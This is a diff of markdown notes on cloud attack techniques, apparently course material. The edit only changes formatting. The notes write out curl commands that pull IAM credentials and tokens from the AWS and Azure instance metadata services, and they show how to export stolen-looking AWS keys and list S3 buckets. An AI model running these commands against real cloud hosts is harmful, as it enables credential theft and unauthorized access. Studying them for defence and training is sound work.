@@ -34,14 +34,14 @@ Mitre ATT&CK Cloud matrix - https://attack.mitre.org/matrices/enterprise/cloud/
 - List of security creds saved in AWS - ```http://169.254.169.254/latest/meta-data/iam/security-credentials/```
 - Get AUTH token ```TOKEN=$(curl -s -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds:21600" http://169.254.169.254/latest/api/token)```
 - Use AUTH token in the request ```curl -H "X-aws-ec2-metadata-token: $TOKEN"http://169.254.169.254/latest/meta-data/iam/security-credentials/sec510-ec2
-AWS AUTH using stlen creds
-```
+- AWS AUTH using stlen creds
+'''
 $ export AWS_ACCESS_KEY_ID="ASIA54BL6PJR3MV6PUNZ"
 $ export AWS_SECRET_ACCESS_KEY="S0M6vF4UmMlfmV5B/bM2lTzocsSWMMHRI"
 $ export AWS_SESSION_TOKEN="IQoJb3JpZjEJ...3QtMSJEQCIykQYitLv8Vg=="
 
 $ aws s3api list-buckets
-```
+'''
 ##### Azure 
 - JWT for accessing the storage service ```curl "http://169.254.169.254/metadata/identity/oauth2/token?apiversion=2018-02-01&resource=https://storage.azure.com/" -H "Metadata: true"```
 
